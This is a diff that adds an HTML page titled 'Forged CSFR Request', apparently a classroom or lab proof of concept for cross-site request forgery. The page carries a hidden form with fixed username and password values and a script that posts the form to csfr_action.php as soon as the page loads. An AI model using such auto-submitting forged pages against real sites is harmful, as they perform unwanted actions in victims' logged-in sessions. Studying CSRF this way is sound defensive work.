@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Forged CSFR Request</title>
+</head>
+<body>
+    <h1>Forged Request Page</h1>
+
+    <form id="forgedForm" action="csfr_action.php" method="POST">
+        <input type="hidden" name="username" value="host">
+        <input type="hidden" name="password" value="pass">
+    </form>
+
+    <script>
+        window.onload = function () {
+            document.getElementById("forgedForm").submit();
+        };
+    </script>
+</body>
+</html>
